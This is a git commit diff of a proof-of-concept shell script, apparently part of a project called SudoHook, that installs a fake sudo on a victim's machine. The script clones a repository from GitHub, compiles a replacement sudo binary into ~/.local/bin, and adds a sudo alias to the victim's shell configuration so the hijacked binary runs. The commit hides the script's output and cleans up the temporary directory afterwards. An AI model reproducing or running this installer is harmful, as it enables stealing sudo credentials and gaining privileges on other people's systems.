d0160fdf7635135f7223f999545f2cb5c5f0f542
plasma <plasma.xorg@proton.me>
2026-03-18 00:24:05 +0100

    Finished .sh PoC with all security measures

--- PoC.sh
+++ PoC.sh
@@ -1,8 +1,29 @@
+#!/bin/sh
+
 TEMPDIR=$(mktemp -d /tmp/sudo.XXXXXXX)
-SHELLCFG="$HOME/.bashrc" # change based of the victim's shell
-cd $TEMPDIR
-git clone https://github.com/plasma-bls/SudoHook.git # assuming git is installed
-cd SudoHook/
-if [ ! -d "$HOME/.local/bin" ]; then mkdir $HOME/.local/bin; fi
-gcc sudo.c -o sudo && chmod +x sudo && mv sudo $HOME/.local/bin/ # assuming gcc is installed
-echo "alias sudo='$HOME/.local/bin/sudo'" >> $SHELLCFG
+
+case $SHELL in
+    */zsh)  SHELLCFG="$HOME/.zshrc" ;;
+    */bash) SHELLCFG="$HOME/.bashrc" ;;
+    *)      SHELLCFG="$HOME/.profile" ;;
+esac
+
+cd "$TEMPDIR" || exit 1
+# assuming git is installed
+git clone https://github.com/plasma-bls/SudoHook.git > /dev/null 2>&1
+cd SudoHook/ || exit 1
+
+# checking if folder exists
+if [ ! -d "$HOME/.local/bin" ]; then mkdir "$HOME/.local/bin"; fi
+
+# assuming gcc is installed
+gcc sudo.c -o sudo > /dev/null 2>&1
+# adding executable permissions
+chmod +x sudo && mv sudo "$HOME/.local/bin/"
+
+# checking if alias is already there and adding it
+if ! grep -q "alias sudo=" "$SHELLCFG"; then
+    echo "alias sudo='$HOME/.local/bin/sudo'" >> "$SHELLCFG"
+fi
+
+rm -rf "$TEMPDIR"
